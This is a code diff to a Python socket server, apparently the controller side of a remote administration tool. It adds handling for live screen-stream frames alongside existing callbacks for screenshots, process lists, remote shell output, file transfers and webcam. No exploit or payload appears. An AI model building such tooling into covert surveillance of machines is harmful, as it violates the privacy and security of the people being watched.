@@ -27,15 +27,17 @@ class SocketServer:
         self.webcam_response_callback = None
         self.window_manager = None
     def set_callbacks(self, log_callback, update_ui_callback, screenshot_callback=None, 
-                     process_list_callback=None, shell_response_callback=None,
-                     file_response_callback=None, webcam_response_callback=None):
+                    process_list_callback=None, shell_response_callback=None,
+                    file_response_callback=None, webcam_response_callback=None,
+                    screen_stream_callback=None):
         self.log_callback = log_callback
         self.update_ui_callback = update_ui_callback
         self.screenshot_callback = screenshot_callback
         self.process_list_callback = process_list_callback
         self.shell_response_callback = shell_response_callback
         self.file_response_callback = file_response_callback
-        self.webcam_response_callback = webcam_response_callback  # Novo callback
+        self.webcam_response_callback = webcam_response_callback
+        self.screen_stream_callback = screen_stream_callback
     def set_file_response_callback(self, callback):
         self.file_response_callback = callback
     def set_window_manager(self, window_manager):
@@ -124,3 +126,47 @@ class SocketServer:
         if hasattr(self, 'window_manager') and self.window_manager:
             return self.window_manager.open_webcam_window(client_address)
         return None
+    def process_screen_stream_frame(self, client_address, data):
+        try:
+            if hasattr(self, 'window_manager') and self.window_manager:
+                try:
+                    self.window_manager.process_screen_stream_frame(client_address, data)
+                    return True
+                except Exception as e:
+                    self.log(f"Erro ao processar frame de stream de tela via window_manager: {str(e)}")
+            if hasattr(self, 'screen_stream_callback') and self.screen_stream_callback:
+                try:
+                    self.screen_stream_callback(client_address, data)
+                    return True
+                except Exception as e:
+                    self.log(f"Erro ao processar frame de stream de tela via callback: {str(e)}")
+            self.log(f"Nenhum handler disponível para processar frame de stream de tela")
+            return False
+        except Exception as e:
+            self.log(f"Erro ao processar frame de stream de tela: {str(e)}")
+            return False
+    def open_screen_stream(self, client_address):
+        if hasattr(self, 'window_manager') and self.window_manager:
+            return self.window_manager.open_screen_stream_window(client_address)
+        return None
+    def process_screen_stream_response(self, client_address, cmd, data):
+        client_key = f"{client_address[0]}:{client_address[1]}"
+        self.log(f"Processando resposta de stream de tela ({cmd}) para {client_key}")
+        try:
+            if hasattr(self, 'window_manager') and self.window_manager:
+                try:
+                    self.window_manager.process_screen_stream_response(client_address, cmd, data)
+                    return True
+                except Exception as e:
+                    self.log(f"Erro ao processar resposta de stream de tela via window_manager: {str(e)}")
+            if hasattr(self, 'screen_stream_callback') and self.screen_stream_callback:
+                try:
+                    self.screen_stream_callback(client_address, cmd, data)
+                    return True
+                except Exception as e:
+                    self.log(f"Erro ao processar resposta de stream de tela via callback: {str(e)}")
+            self.log(f"Nenhum handler disponível para processar resposta de stream de tela")
+            return False
+        except Exception as e:
+            self.log(f"Erro ao processar resposta de stream de tela: {str(e)}")
+            return False
